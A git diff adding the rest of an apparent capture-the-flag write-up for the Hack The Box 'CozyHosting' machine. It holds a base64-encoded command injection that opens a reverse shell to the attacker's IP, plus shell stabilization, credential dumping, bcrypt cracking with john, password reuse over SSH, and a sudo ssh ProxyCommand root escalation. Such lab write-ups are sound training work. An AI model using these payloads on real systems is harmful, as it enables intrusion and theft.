@@ -212,26 +212,142 @@ Now this is the final payload that will help bypass the whitespace function and 
 
 Ensure you set up your netcat listener before doing this
 
-payload:```;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvMTIzNCAwPiYexitx"|base64${IFS}-d|bash;```
+payload:```;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvMTIzNCAwPiYx"|base64${IFS}-d|bash;```
 
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1cb31819-7d38-4d81-b62a-cb101356e0b9)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b767e9ed-7fe4-48da-8a84-5245bf79315d)
 
 After sending this request, check your netcat listener
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d425f099-3622-484b-bf43-29631caa59cd)
+
+nice nice, we spawned a shell hehe.
+
+We can use the below commands to stabilize this shell
+
+```
+python3 -c “import pty;pty.spawn(‘/bin/bash’)”
+ctrl + z (to background)
+stty raw -echo && fg
+export TERM=xterm
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/197da091-835b-4ddd-b1fd-6926aaa7fbb3)
+
+Now, lets go ahead to escalate our privileges
 
 
 
+# Privilege Escalation
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2b94a69a-37e7-411b-9e00-c0fd1bdd7ede)
+
+Lets download this file to our machine
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5478682e-3382-4933-8e17-586b0a5a341d)
+
+To extract this
+
+```
+mv cloudhosting-0.0.1.jar cloudhosting.zip
+unzip cloudhosting.zip
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7d528afb-a0e1-4db3-9fb9-4e8076eccc6a)
+
+Going through the extracted files, I found this
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/aa27a3a2-331f-4476-9392-b3ed55b3491e)
+
+We got creds for the postgresql database.
+
+Lets confirm if truly we can access postgresql on this server. The default port for PostgreSQL is 5432, to confirm this
+
+command:```netstat -tuln | grep 5432```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/757e887f-01a2-4e29-b59d-e2ca88fd7386)
+
+nice, we should be able to connect to the database
+
+To connect to the database
+
+command:```psql -U postgres -h 127.0.0.1 -p 5432 -d cozyhosting```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cde1a8a0-9e41-4fd2-b9b3-d3ae200513b3)
+
+Using the ```\dt``` command, we should be able to check the contents of the database
+
+```
+cozyhosting=# \dt
+         List of relations
+ Schema | Name  | Type  |  Owner   
+--------+-------+-------+----------
+ public | hosts | table | postgres
+ public | users | table | postgres
+(2 rows)
+```
+Lets dump the table ```users``` using the command, ```select * from users;```
+
+```
+cozyhosting=# select * from users;
+ name    |                           password                           | role  
+-----------+--------------------------------------------------------------+-------
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+(2 rows)
+```
+We got 2 password hashes. Lets try to crack them using john
+
+command:```john hash --wordlist=/usr/share/wordlists/rockyou.txt```
+
+```
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/cozyhosting]
+└─$ nano hash
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/cozyhosting]
+└─$ cat hash
+user:$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
+admin:$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/cozyhosting]
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+manchesterunited (admin)     
+1g 0:00:02:48 0.07% (ETA: 2023-10-23 15:47) 0.005924g/s 68.24p/s 84.88c/s 84.88C/s silencio..bigben
+Use the "--show" option to display all of the cracked passwords reliably
+```
+We were able to successfully crack the admin password hash.
+
+From the ```/etc/passwd``` file, we know that there's another user ```josh```, lets try to ssh into the server using that password
+
+username:```josh```            password:```manchesterunited```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b06e6359-1caf-41f6-bb6c-7befc991fe03)
+
+We are in😎. Lets further escalate our privileges.
+
+Running the ```sudo -l``` command
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/91f94727-ac08-485e-9242-4650579c3b78)
+
+smooth, user ```josh``` can run the ssh executable with root privileges.
+
+I went over to [GTFOBins](https://gtfobins.github.io/) and got this payload ```sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x```.
+
+Applying that payload should land us in a root shell
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ca55604b-686b-4fe5-8a68-5b35faca20aa)
+
+We have successfully pwned this box😎
 
 
-
-
-
-
-
-
-
-
-
+That will be all for today
+<br><br>
+[Back To Home](../../index.md)
 
 
 
